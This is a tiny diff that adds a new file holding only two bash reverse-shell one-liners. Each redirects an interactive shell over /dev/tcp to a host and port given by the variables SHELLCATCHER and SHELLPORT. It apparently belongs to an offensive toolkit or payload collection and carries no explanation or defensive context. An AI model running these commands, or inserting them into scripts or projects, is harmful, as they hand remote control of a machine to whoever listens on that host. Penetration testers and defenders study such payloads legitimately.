@@ -1,0 +1,3 @@
+/bin/bash -i >& /dev/tcp/${SHELLCATCHER}/${SHELLPORT} 0>&1
+
+/bin/bash -c '/bin/bash -i > /dev/tcp/${SHELLCATCHER}/${SHELLPORT} 0>&1'
